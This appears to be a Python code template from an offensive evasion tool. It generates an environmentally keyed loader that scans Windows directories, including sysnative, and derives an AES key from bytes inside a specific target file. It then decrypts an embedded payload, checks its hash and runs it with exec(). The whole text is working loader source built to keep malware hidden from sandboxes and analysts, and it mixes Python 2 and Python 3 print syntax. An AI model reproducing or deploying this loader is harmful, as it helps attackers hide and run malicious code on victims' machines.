buildcode = """import os
import hashlib
import sys
import struct
import base64
import zlib
import ctypes
from Crypto.Cipher import AES
from Crypto import Random

class build_code():
    def __init__(self, lookup_table, payload_hash, input_file, minus_bytes, key_iterations):
        self.lookup_table = lookup_table
        self.location = struct.unpack("<I", self.lookup_table[0:4])[0]
        self.key_len = struct.unpack("<H", self.lookup_table[4:6])[0]
        self.iv = self.lookup_table[6:22]
        self.encrypted_msg = self.lookup_table[22:]
        self.payload_hash = payload_hash
        self.input_file = input_file
        self.key_iterations = key_iterations
        self.payload = ''
        self.check = False
        self.minus_bytes = int(minus_bytes)

    def check_hash(self):
        # Check the final payload hash - minus_bytes before execution

        if hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest() == self.payload_hash:
            self.check = True
            print("[*] Hashes are equal!")
            return True
        else:
            return False


    def search(self):
        with open(self.input_file, 'rb') as f:
            f.seek(self.location)
            self.key_loc = f.read(self.key_len)

        key_iterations = self.key_iterations
        
        print ("[*] Key iterations:", key_iterations)
        
        while key_iterations > 1:
            self.key_loc = hashlib.sha512(self.key_loc).digest()
            key_iterations -= 1

        self.key = hashlib.sha512(self.key_loc).digest()[:32]
        print ("[*] Encryption key:", self.key)
        self.cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
        self.payload = self.cipher.decrypt(self.encrypted_msg)
        
    def execute_code(self):
        exec(self.cipher.decrypt(zlib.decompress(base64.b64decode("{3}"))))
        
    def run(self):
        self.search()
        if self.check_hash() is True:
            self.execute_code()
            return True


def walk_native64(lookup_table, payload_hash, minus_bytes, key_iterations):
    for root, dirs, files in os.walk(r"c:\Windows\sysnative\", topdown=True):
        for name in files:
            print("[*] Checking:", os.path.join(root, name))
            try:
                result = build_code(lookup_table, payload_hash, os.path.join(root, name), minus_bytes, key_iterations)
                result.run()
            except IOError:
                continue
    
def walk_os(lookup_table, payload_hash, minus_bytes, scan_dir, key_iterations):
    # make method for 
    # need to add sysnative checks
    sys_paths = [r"c:\", r"c:\windows\", r"c:\windows\system32"]
    
    import platform
    if '32' in platform.architecture()[0] and scan_dir.lower() in sys_paths:
        # 32 bit use sysnative to check x64 c:\Windows\sysnative
        print "[*] Scanning sysnative"
        walk_native64(lookup_table, payload_hash, minus_bytes, key_iterations)

    for root, dirs, files in os.walk(scan_dir, topdown=True):
        for name in files:
            print("[*] Checking:", os.path.join(root, name))
            try:
                result = build_code(lookup_table, payload_hash, os.path.join(root, name), minus_bytes, key_iterations)
                result.run()
            except IOError:
                continue
            

def main():
    lookup_table = zlib.decompress(base64.b64decode("{0}"))
    payload_hash = "{1}"
    minus_bytes = "{2}"
    scan_dir = r"{4}"
    key_iterations = int("{5}")
    if scan_dir.endswith("%") and scan_dir.startswith("%"):
        print "[*] Env variable", scan_dir
        # over write scan_dir variable
        # strip staring and ending % from env var
        scan_dir = os.getenv(scan_dir[1:-1])
        print "[*] Path ", scan_dir
        if scan_dir == None:
            sys.exit(0)

    walk_os(lookup_table, payload_hash, minus_bytes, scan_dir, key_iterations)

if __name__ == "__main__":
    main()
"""
